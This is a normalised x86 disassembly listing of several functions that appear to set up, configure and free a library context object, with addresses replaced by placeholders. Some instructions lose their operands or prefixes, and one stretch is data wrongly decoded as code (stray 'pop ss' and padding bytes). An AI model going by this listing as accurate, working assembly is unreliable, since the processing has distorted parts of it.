mov [ esi + 0x100 ] edi
cmp eax edi
jne r-xdata
push eax
call sub_1001d370
add esp 0x4
mov [ esi + 0x90 ] edi
mov ecx [ esi + 0x8 ]
push esi
call [ ecx + 0x8 ]
add esp 0x4
cmp [ esi + 0xbc ] edi
jne r-xdata
mov edx [ esi + 0xd8 ]
mov eax [ esi + 0x8 ]
cmp eax [ edx ]
je r-xdata
push esi
call [ eax + 0xc ]
mov eax [ esi + 0xd8 ]
push esi
mov eax [ eax ]
mov [ esi + 0x8 ] eax
call [ eax + 0x4 ]
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
pop edi
pop esi
retn
sub_1000d260
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
test ebp ebp
push edi
jne r-xdata
cmp [ ebp ] 0x0
jne r-xdata
push 0xf9
push r--data
push 0xc3
jmp r-xdata
push 0x102
push r--data
push 0x138
call sub_1001d4c0
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
push 0xfe
push r--data
push 0xe4
jmp r-xdata
push 0xba
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x15f
push r--data
push 0x41
mov ecx 0x4e
xor eax eax
mov edi ebx
[ edi ]
mov eax [ ebp + 0xa4 ]
mov [ ebx + 0xf4 ] eax
mov ecx [ ebp + 0xa8 ]
mov [ ebx + 0xf8 ] ecx
mov edx [ ebp + 0xac ]
mov [ ebx + 0xfc ] edx
mov eax [ ebp + 0xb0 ]
test eax eax
je r-xdata
mov [ ebx + 0x94 ] 0x0
push eax
call sub_10010c10
add esp 0x4
mov [ ebx + 0x94 ] eax
test eax eax
je r-xdata
lea esi [ ebp + 0xc8 ]
lea edi [ ebx + 0x9c ]
mov ecx 0x8
[ edi ] [ esi ]
mov ecx [ ebp + 0xe8 ]
mov [ ebx + 0xc8 ] ecx
mov edx [ ebp + 0xec ]
mov [ ebx + 0xc0 ] edx
call sub_1001f900
test eax eax
mov [ ebx + 0x70 ] eax
je r-xdata
push r--data
push 0x129
push r--data
call sub_1001f8d0
mov eax [ ebx + 0x94 ]
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0xf0 ]
push ecx
push eax
call sub_1001f9b0
mov edx [ ebp + 0xf4 ]
push 0x138
push r--data
lea edi [ ebp + 0x60 ]
push 0xc
push 0x1
push edi
mov [ ebx + 0x2c ] edx
call sub_1001f5f0
push 0x144
push r--data
push 0xc
xor esi esi
or eax 0xffffffff
push 0x1
push edi
mov [ ebx + 0xd8 ] ebp
mov [ ebx + 0x108 ] esi
mov [ ebx + 0x10c ] esi
mov [ ebx + 0x130 ] esi
mov [ ebx + 0x118 ] eax
mov [ ebx + 0x11c ] esi
mov [ ebx + 0x120 ] esi
mov [ ebx + 0x124 ] esi
mov [ ebx + 0x128 ] esi
mov [ ebx + 0x12c ] eax
call sub_1001f5f0
mov [ ebx + 0x134 ] ebp
mov [ ebx + 0xe0 ] esi
mov eax [ ebp ]
push ebx
mov [ ebx + 0x8 ] eax
call [ eax + 0x4 ]
add esp 0x34
test eax eax
jne r-xdata
mov eax [ ebx + 0xd8 ]
test eax eax
je r-xdata
push eax
call sub_10010e70
add esp 0x4
mov eax [ ebp + 0xb4 ]
mov [ ebx + 0x60 ] eax
mov ecx [ ebp + 0xb8 ]
mov [ ebx + 0x64 ] ecx
mov edx [ ebp + 0xbc ]
mov [ ebx + 0x68 ] edx
mov eax [ ebp + 0xc0 ]
mov [ ebx + 0xc4 ] eax
mov eax [ ebp + 0xc4 ]
cmp eax 0x20
mov [ ebx + 0x98 ] eax
jbe r-xdata
mov [ ebx + 0xf0 ] 0x1
mov eax [ ebp ]
xor ecx ecx
push ebx
cmp [ eax + 0x10 ] sub_1000e650
setne cl
mov [ ebx + 0x24 ] ecx
call sub_1000d0d0
lea edx [ ebx + 0xe4 ]
push edx
push ebx
push 0x1
call sub_1001f420
add esp 0x10
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
call sub_1001d740
add esp 0x4
push eax
call sub_1000e370
add esp 0x4
sub_1000d4d0
mov eax 0xd8
call sub_1001d0d0
mov edx [ esp + 0xe4 ]
cmp edx 0x20
jbe r-xdata
push ebx
mov ebx [ esp + 0xe0 ]
mov ecx edx
push esi
mov eax [ ebx ]
mov esi [ esp + 0xe8 ]
mov [ esp + 0x8 ] eax
mov eax ecx
push edi
lea edi [ esp + 0x54 ]
shr ecx 0x2
mov [ esp + 0x50 ] edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ esp + 0xc ] 0x2
jne r-xdata
xor eax eax
add esp 0xd8
retn
push 0x1ab
push r--data
push 0xc
push 0x5
call sub_1001f5b0
mov ecx [ ebx + 0xd8 ]
lea eax [ esp + 0x1c ]
push eax
mov edx [ ecx + 0x10 ]
push edx
call sub_1001ff80
push 0x1ad
push r--data
push 0xc
push 0x6
mov esi eax
call sub_1001f5b0
add esp 0x28
xor eax eax
test esi esi
pop edi
pop esi
setne al
pop ebx
add esp 0xd8
retn
cmp edx 0x10
jae r-xdata
mov ecx 0x10
lea edi [ esp + edx + 0x54 ]
sub ecx edx
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov [ esp + 0x50 ] 0x10
sub_1000d5a0
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
cmp esi edi
je r-xdata
pop edi
pop esi
retn
push 0x1cc
push r--data
push 0x10
lea eax [ esi + 0xf0 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov eax [ esi + 0x70 ]
cmp eax edi
je r-xdata
lea ecx [ esi + 0xe4 ]
push ecx
push esi
push 0x1
call sub_1001f490
mov eax [ esi + 0x14 ]
add esp 0xc
cmp eax edi
je r-xdata
push eax
call sub_1001f960
add esp 0x4
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
mov ecx [ esi + 0x10 ]
cmp eax ecx
jne r-xdata
mov eax [ esi + 0x10 ]
cmp eax edi
je r-xdata
push eax
call sub_10020f20
add esp 0x4
mov edx [ esi + 0x14 ]
push edx
call sub_10020880
add esp 0x4
mov [ esi + 0x14 ] edi
push ecx
call sub_10020e30
add esp 0x4
mov [ esi + 0x10 ] eax
mov eax [ esi + 0x3c ]
cmp eax edi
je r-xdata
cmp eax [ esi + 0xc ]
je r-xdata
mov eax [ esi + 0x74 ]
cmp eax edi
je r-xdata
push eax
call sub_1001dca0
add esp 0x4
push eax
call sub_10020f20
add esp 0x4
mov eax [ esi + 0x78 ]
cmp eax edi
je r-xdata
push eax
call sub_1001e780
add esp 0x4
cmp [ esi + 0xbc ] edi
je r-xdata
push eax
call sub_1001e780
add esp 0x4
mov eax [ esi + 0x7c ]
cmp eax edi
je r-xdata
push esi
call sub_1000faa0
mov eax [ esi + 0xbc ]
push eax
call sub_1000f8e0
add esp 0x8
mov eax [ esi + 0x88 ]
cmp eax edi
je r-xdata
push eax
call sub_1001db30
mov ecx [ esi + 0x7c ]
push ecx
call sub_1001d740
add esp 0x8
mov [ esi + 0x7c ] edi
mov eax [ esi + 0x84 ]
cmp eax edi
je r-xdata
push eax
call sub_1001db30
mov edx [ esi + 0x88 ]
push edx
call sub_1001d740
add esp 0x8
mov [ esi + 0x88 ] edi
mov eax [ esi + 0x90 ]
cmp eax edi
je r-xdata
push eax
call sub_1001d370
add esp 0x4
mov [ esi + 0x84 ] edi
mov eax [ esi + 0x94 ]
cmp eax edi
je r-xdata
push eax
call sub_1001d370
add esp 0x4
mov [ esi + 0x90 ] edi
mov eax [ esi + 0xd8 ]
cmp eax edi
je r-xdata
push eax
call sub_10010e70
add esp 0x4
mov eax [ esi + 0x110 ]
cmp eax edi
je r-xdata
push eax
call sub_1000e370
add esp 0x4
mov eax [ esi + 0x134 ]
cmp eax edi
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esi + 0x124 ]
cmp eax edi
je r-xdata
push eax
call sub_1000e370
add esp 0x4
mov eax [ esi + 0x120 ]
cmp eax edi
je r-xdata
push sub_10020790
push eax
call sub_1001e730
add esp 0x8
mov eax [ esi + 0x128 ]
cmp eax edi
je r-xdata
push sub_10020700
push eax
call sub_1001e730
add esp 0x8
mov eax [ esi + 0xec ]
cmp eax edi
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
push sub_10020210
push eax
call sub_1001e730
add esp 0x8
push esi
call sub_1001d740
add esp 0x4
push esi
call [ eax + 0xc ]
add esp 0x4
sub_1000d7d0
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0x8 ]
push 0x100
mov [ esp + 0x4 ] 0xffffffff
mov eax [ eax + 0xc ]
push eax
call sub_10020ee0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp ]
pop ecx
retn
lea ecx [ esp ]
push ecx
push 0x0
push 0x69
push eax
call sub_10020c60
add esp 0x10
sub_1000d820
push esi
push edi
xor esi esi
call sub_10020fd0
push eax
call sub_100207d0
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
mov eax [ esp + 0x10 ]
push eax
push 0x0
push 0x68
push edi
call sub_10020bc0
mov esi [ esp + 0x1c ]
add esp 0x10
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push 0x25a
push r--data
push 0x7
push 0xc0
push 0x14
call sub_1001de60
add esp 0x14
mov eax esi
pop edi
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ esi + 0x10 ]
cmp ecx eax
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
cmp eax edi
je r-xdata
mov ecx [ ecx + 0x24 ]
mov [ esi + 0x10 ] ecx
mov [ eax + 0x24 ] 0x0
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
pop edi
mov eax 0x1
pop esi
retn
cmp eax edi
je r-xdata
push eax
call sub_10020f20
add esp 0x4
cmp [ esi + 0xc ] eax
je r-xdata
push eax
call sub_10020f20
add esp 0x4
sub_1000d8d0
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
cmp [ esi + 0x20 ] edi
jne r-xdata
mov ecx [ esi + 0x8 ]
push esi
call [ ecx + 0x14 ]
add esp 0x4
pop edi
pop esi
retn
mov eax [ esi + 0x8 ]
mov [ esi + 0x24 ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] 0x5000
mov ecx [ eax + 0x14 ]
mov eax [ esi + 0x7c ]
cmp eax edi
mov [ esi + 0x20 ] ecx
je r-xdata
mov eax [ esi + 0x88 ]
cmp eax edi
je r-xdata
push eax
call sub_1001db30
mov edx [ esi + 0x7c ]
push edx
call sub_1001d740
add esp 0x8
mov [ esi + 0x7c ] edi
mov eax [ esi + 0x84 ]
cmp eax edi
je r-xdata
push eax
call sub_1001db30
mov eax [ esi + 0x88 ]
push eax
call sub_1001d740
add esp 0x8
mov [ esi + 0x88 ] edi
mov eax [ esi + 0x90 ]
cmp eax edi
je r-xdata
push eax
call sub_1001d370
add esp 0x4
mov [ esi + 0x84 ] edi
push eax
call sub_1001d370
add esp 0x4
mov [ esi + 0x90 ] edi
sub_1000d990
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x20 ]
test ecx ecx
jne r-xdata
test [ eax + 0x30 ] 0x2
je r-xdata
push 0x37a
push r--data
push 0x114
push 0xdf
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
retn
mov edx [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
push edx
mov edx [ esp + 0xc ]
push edx
push eax
call [ ecx + 0x18 ]
add esp 0xc
retn
mov [ eax + 0x18 ] 0x1
xor eax eax
retn
sub_1000d9f0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x20 ]
test ecx ecx
jne r-xdata
test [ eax + 0x30 ] 0x2
je r-xdata
push 0x38a
push r--data
push 0x114
push 0x10e
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
retn
mov edx [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
push edx
mov edx [ esp + 0xc ]
push edx
push eax
call [ ecx + 0x1c ]
add esp 0xc
retn
xor eax eax
retn
sub_1000da40
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x20 ]
test ecx ecx
jne r-xdata
mov dl [ eax + 0x30 ]
mov ecx 0x1
test cl dl
je r-xdata
push 0x399
push r--data
push 0x114
jmp r-xdata
mov edx [ esp + 0xc ]
mov ecx [ eax + 0x8 ]
push edx
mov edx [ esp + 0xc ]
push edx
push eax
call [ ecx + 0x20 ]
add esp 0xc
retn
push 0x3a0
push r--data
mov [ eax + 0x18 ] ecx
push 0xcf
push 0xd0
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
retn
sub_1000dab0
mov ecx [ esp + 0x8 ]
lea eax [ ecx - 0x10 ]
cmp eax 0x23
ja r-xdata
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0x14 ]
mov edx [ eax + 0x8 ]
push esi
mov esi [ esp + 0x14 ]
push esi
push ecx
push eax
call [ edx + 0x40 ]
add esp 0x10
pop esi
retn
xor edx edx
mov dl [ eax + lookup_table_1000dba8 ]
jmp [ edx * 4 + jump_table_1000db84 ]
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x60 ]
retn
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
mov eax [ ecx + 0x60 ]
mov [ ecx + 0x60 ] edx
retn
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x10 ]
mov [ ecx + 0x68 ] eax
mov eax 0x1
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0xc ]
mov ecx [ eax + 0xf4 ]
or ecx edx
mov [ eax + 0xf4 ] ecx
mov eax ecx
retn
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov edx [ eax + 0xf8 ]
or edx ecx
mov [ eax + 0xf8 ] edx
mov eax edx
retn
mov edx [ esp + 0x4 ]
mov eax [ edx + 0xfc ]
retn
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
mov eax [ ecx + 0xfc ]
mov [ ecx + 0xfc ] edx
retn
mov eax [ esp + 0x4 ]
cmp [ eax ] 0xfeff
jne r-xdata
xor eax eax
retn
mov ecx [ eax + 0x5c ]
mov eax [ esp + 0xc ]
mov [ ecx + 0xa0 ] eax
retn
sub_1000dbd0
mov ecx [ esp + 0x8 ]
lea eax [ ecx - 0x10 ]
cmp eax 0x23
ja r-xdata
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0x14 ]
mov edx [ eax ]
push esi
mov esi [ esp + 0x14 ]
push esi
push ecx
push eax
call [ edx + 0x44 ]
add esp 0x10
pop esi
retn
xor edx edx
mov dl [ eax + lookup_table_1000dd84 ]
jmp [ edx * 4 + jump_table_1000dd24 ]
mov eax [ esp + 0x4 ]
mov eax [ eax + 0xb4 ]
retn
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
mov eax [ ecx + 0xb4 ]
mov [ ecx + 0xb4 ] edx
retn
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x10 ]
mov [ ecx + 0xbc ] eax
mov eax 0x1
retn
mov edx [ esp + 0x4 ]
mov eax [ edx + 0xac ]
retn
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
mov eax [ ecx + 0xac ]
mov [ ecx + 0xac ] edx
retn
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
mov eax [ ecx + 0x14 ]
mov [ ecx + 0x14 ] edx
retn
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x14 ]
retn
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
mov eax [ ecx + 0x20 ]
mov [ ecx + 0x20 ] edx
retn
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x20 ]
retn
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov eax [ edx + 0x24 ]
retn
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x34 ]
retn
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x3c ]
retn
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x38 ]
retn
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x40 ]
retn
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x48 ]
retn
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x44 ]
retn
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x58 ]
retn
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x5c ]
retn
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x4c ]
retn
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x50 ]
retn
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x54 ]
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0xc ]
mov ecx [ eax + 0xa4 ]
or ecx edx
mov [ eax + 0xa4 ] ecx
mov eax ecx
retn
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov edx [ eax + 0xa8 ]
or edx ecx
mov [ eax + 0xa8 ] edx
mov eax edx
retn
sub_1000dd9c
movups xmm2 [ ecx ]
adc dl [ ebx ]
adc al 0x17
pop ss
pop ss
pop ss
adc eax 0x90909016
nop
nop
nop
nop
nop
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ecx + 0x8 ]
sub eax edx
jne r-xdata
xor edx edx
test eax eax
setle dl
dec edx
and edx 0x2
dec edx
mov eax edx
retn
xor eax eax
retn
sub_1000dde0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ eax ]
mov edx [ edx ]
mov eax [ ecx + 0x8 ]
mov ecx [ edx + 0x8 ]
sub eax ecx
jne r-xdata
xor ecx ecx
test eax eax
setle cl
dec ecx
and ecx 0x2
dec ecx
mov eax ecx
retn
xor eax eax
retn
sub_1000de10
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + 0x74 ]
test eax eax
jne r-xdata
retn
mov eax [ ecx + 0xd8 ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_1000de40
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + 0x78 ]
test eax eax
jne r-xdata
retn
mov eax [ ecx + 0xd8 ]
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
sub_1000de70
push ebx
mov ebx [ esp + 0xc ]
test ebx ebx
jne r-xdata
push esi
mov esi [ esp + 0x14 ]
push edi
push ebx
mov [ esp + 0x18 ] esi
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
xor eax eax
pop ebx
retn
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
sub eax ecx
pop ebx
retn
push ebp
mov ebp [ esp + 0x20 ]
mov ecx [ esp + 0x14 ]
push esi
push eax
mov edx [ ecx + 0x8 ]
call [ edx + 0x4c ]
push esi
push eax
call ebp
jmp r-xdata
push edi
push ebx
call sub_1001e7c0
add esp 0x8
test ebp ebp
je r-xdata
pop ebp
add esp 0x8
add esi eax
inc edi
push ebx
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
sub_1000dee0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
push 0x0
mov eax [ ebp + 0x8 ]
push 0x0
call [ eax + 0x4c ]
mov esi eax
mov eax [ esp + 0x24 ]
cdq
idiv esi
add esp 0x8
test edx edx
je r-xdata
mov edi [ esp + 0x20 ]
test edi edi
je r-xdata
push 0x515
push r--data
push 0x97
push 0xa1
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
call sub_1001e3c0
mov [ esp + 0x14 ] eax
mov eax [ edi ]
test eax eax
je r-xdata
test edi edi
je r-xdata
mov edi [ esp + 0x18 ]
push eax
mov [ esp + 0x18 ] eax
call sub_1001e710
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esp + 0x14 ]
mov [ edi ] ecx
mov eax [ esp + 0x1c ]
add ebx esi
cmp ebx eax
jl r-xdata
mov edx [ esp + 0x14 ]
push eax
push edx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
xor ebx ebx
test eax eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
push edi
call [ ecx + 0x48 ]
add esp 0x4
add edi esi
test eax eax
je r-xdata
mov edi [ esp + 0x20 ]
push 0x528
push r--data
push 0x41
push 0xa1
push 0x14
call sub_1001de60
mov eax [ esp + 0x34 ]
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
push eax
call sub_1001e780
add esp 0x4
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
sub_1000dfe0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
xor ebx ebx
xor esi esi
cmp ebp ebx
push edi
jne r-xdata
call sub_10010b00
test eax eax
jge r-xdata
push 0x575
push r--data
push 0xc4
push 0xa9
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x586
push r--data
push 0x140
call sub_1001d4c0
mov esi eax
add esp 0xc
cmp esi ebx
je r-xdata
push 0x583
push r--data
push 0x10d
push 0xa9
push 0x14
call sub_1001de60
add esp 0x14
push 0x610
push r--data
push 0x41
jmp r-xdata
push 0x610
push r--data
push 0x41
jmp r-xdata
mov ecx 0x50
xor eax eax
mov edi esi
[ edi ]
mov [ esi ] ebp
mov [ esi + 0xc ] ebx
mov [ esi + 0x20 ] 0x2
mov [ esi + 0x14 ] 0x5000
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
call [ ebp + 0x60 ]
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x30 ] ebx
mov ecx 0xb
xor eax eax
lea edi [ esi + 0x34 ]
mov [ esi + 0xec ] ebx
[ edi ]
mov [ esi + 0x60 ] 0x1
mov [ esi + 0xf4 ] ebx
mov [ esi + 0x9c ] ebx
mov [ esi + 0x64 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0xac ] 0x19000
mov [ esi + 0xb4 ] ebx
mov [ esi + 0xb8 ] ebx
mov [ esi + 0xbc ] ebx
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xe8 ] ebx
call sub_10010bb0
cmp eax ebx
mov [ esi + 0xb0 ] eax
je r-xdata
push 0xa9
push 0x14
call sub_1001de60
add esp 0x14
cmp esi ebx
je r-xdata
push sub_1000e330
push sub_1000e300
mov [ esi + 0x6c ] ebx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x74 ] ebx
mov [ esi + 0x78 ] ebx
mov [ esi + 0x7c ] ebx
call sub_1001fbd0
add esp 0x8
cmp eax ebx
mov [ esi + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push esi
call sub_1000e370
add esp 0x4
call sub_10021b30
cmp eax ebx
mov [ esi + 0xc ] eax
je r-xdata
mov ecx [ esi ]
lea eax [ esi + 0x8 ]
lea edi [ esi + 0x4 ]
push r--data
push eax
push edi
push ecx
call sub_10010000
mov edi [ edi ]
add esp 0x10
cmp edi ebx
je r-xdata
push 0x5cb
push r--data
push 0xa1
push edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
call sub_1001f900
cmp eax ebx
mov [ esi + 0xf0 ] eax
je r-xdata
push r--data
call sub_10021b20
add esp 0x4
cmp eax ebx
mov [ esi + 0x88 ] eax
jne r-xdata
push r--data
call sub_10021b20
add esp 0x4
cmp eax ebx
mov [ esi + 0x8c ] eax
jne r-xdata
push 0x5d5
push r--data
push 0xf1
jmp r-xdata
push r--data
call sub_10021b20
add esp 0x4
cmp eax ebx
mov [ esi + 0x90 ] eax
jne r-xdata
push 0x5da
push r--data
push 0xf2
jmp r-xdata
call sub_1001e3c0
cmp eax ebx
mov [ esi + 0xa0 ] eax
jne r-xdata
push 0x5df
push r--data
push 0xf3
jmp r-xdata
lea edx [ esi + 0x80 ]
push edx
push esi
push 0x2
call sub_1001f420
mov [ esi + 0x94 ] ebx
call sub_10010af0
mov [ esi + 0x98 ] eax
lea eax [ esi + 0x104 ]
push 0x10
push eax
mov [ esi + 0xfc ] ebx
mov [ esi + 0x100 ] ebx
call sub_10021970
add esp 0x14
test eax eax
jle r-xdata
mov eax [ esi + 0xa4 ]
or ah 0x40
mov [ esi + 0xa4 ] eax
lea ecx [ esi + 0x114 ]
push 0x10
push ecx
call sub_10021900
add esp 0x8
test eax eax
jle r-xdata
lea edx [ esi + 0x124 ]
push 0x10
push edx
call sub_10021900
add esp 0x8
test eax eax
jg r-xdata
mov [ esi + 0x138 ] ebx
mov [ esi + 0x13c ] ebx
mov [ esi + 0xf8 ] ebx
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
sub_1000e300
mov eax [ esp + 0x4 ]
xor ecx ecx
xor edx edx
mov ch [ eax + 0x4b ]
mov dl [ eax + 0x49 ]
mov cl [ eax + 0x4a ]
shl ecx 0x8
or ecx edx
xor edx edx
mov dl [ eax + 0x48 ]
shl ecx 0x8
or ecx edx
mov eax ecx
retn
sub_1000e330
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
push esi
mov ecx [ eax ]
mov esi [ edx ]
cmp ecx esi
je r-xdata
mov ecx [ eax + 0x44 ]
mov esi [ edx + 0x44 ]
cmp ecx esi
je r-xdata
mov eax 0x1
pop esi
retn
push edi
lea esi [ eax + 0x48 ]
lea edi [ edx + 0x48 ]
xor eax eax
[ esi ] [ edi ]
pop edi
je r-xdata
mov eax 0x1
pop esi
retn
pop esi
retn
sbb eax eax
sbb eax 0xffffffff
sub_1000e370
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x621
push r--data
push 0xc
lea eax [ esi + 0x60 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov eax [ esi + 0xf0 ]
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push eax
call sub_1001f960
add esp 0x4
lea ecx [ esi + 0x80 ]
push ecx
push esi
push 0x2
call sub_1001f490
mov eax [ esi + 0x10 ]
add esp 0xc
test eax eax
je r-xdata
push 0x0
push esi
call sub_1000f9c0
add esp 0x8
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_1001fca0
add esp 0x4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_10021c10
add esp 0x4
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_1001e780
add esp 0x4
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call sub_1001e780
add esp 0x4
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
push eax
call sub_10010e70
add esp 0x4
mov eax [ esi + 0x94 ]
test eax eax
je r-xdata
push sub_10020210
push eax
call sub_1001e730
add esp 0x8
mov eax [ esi + 0xf8 ]
mov [ esi + 0x98 ] 0x0
test eax eax
je r-xdata
push sub_10022870
push eax
call sub_1001e730
add esp 0x8
push esi
call sub_1001d740
add esp 0x4
push eax
call sub_10022640
add esp 0x4
sub_1000e490
mov eax [ esp + 0x8 ]
push ebx
xor ebx ebx
push esi
mov ecx [ eax + 0xc ]
mov esi [ esp + 0xc ]
mov [ esp + 0x10 ] ecx
mov cl [ eax + 0x10 ]
test cl 0x2
push edi
je r-xdata
push 0x0
push 0xffffffff
push esi
call sub_10023a40
mov eax [ esi + 0x4 ]
add esp 0xc
test eax eax
je r-xdata
push esi
call sub_10021790
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
mov eax [ esp + 0x14 ]
test al 0x40
je r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
push ebp
push edi
call sub_10023420
push edi
mov ebp eax
call sub_10023940
add esp 0x8
cmp ebp 0xa3
pop ebp
jle r-xdata
pop edi
pop esi
pop ebx
retn
test ah 0x40
je r-xdata
test [ esi + 0x28 ] 0x2
je r-xdata
push eax
call sub_10022ae0
add esp 0x4
mov ebx eax
pop edi
pop esi
xor eax eax
pop ebx
retn
pop edi
pop esi
mov eax 0x1
pop ebx
retn
test [ esi + 0x28 ] 0x2
je r-xdata
test ah 0x40
je r-xdata
test [ esi + 0x2c ] 0x8
jne r-xdata
test [ esi + 0x2c ] 0x80
jne r-xdata
test ah 0x1
je r-xdata
cmp ebx 0x1a0
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
pop edi
pop esi
xor eax eax
pop ebx
retn
cmp ebx 0x8
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
cmp ebx 0x18c
je r-xdata
cmp ebx 0x7
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
sub_1000e570
push ebp
push esi
mov esi [ esp + 0xc ]
push edi
mov ebp [ esi + 0xbc ]
mov eax [ ebp + 0x44 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0xd8 ]
mov ecx [ esp + 0x14 ]
push ebx
mov ebx [ eax + 0x20 ]
mov edi ebx
and edi ecx
je r-xdata
test bl 0x80
pop ebx
jne r-xdata
mov ecx [ esi + 0x6c ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x14 ]
cmp edi eax
jne r-xdata
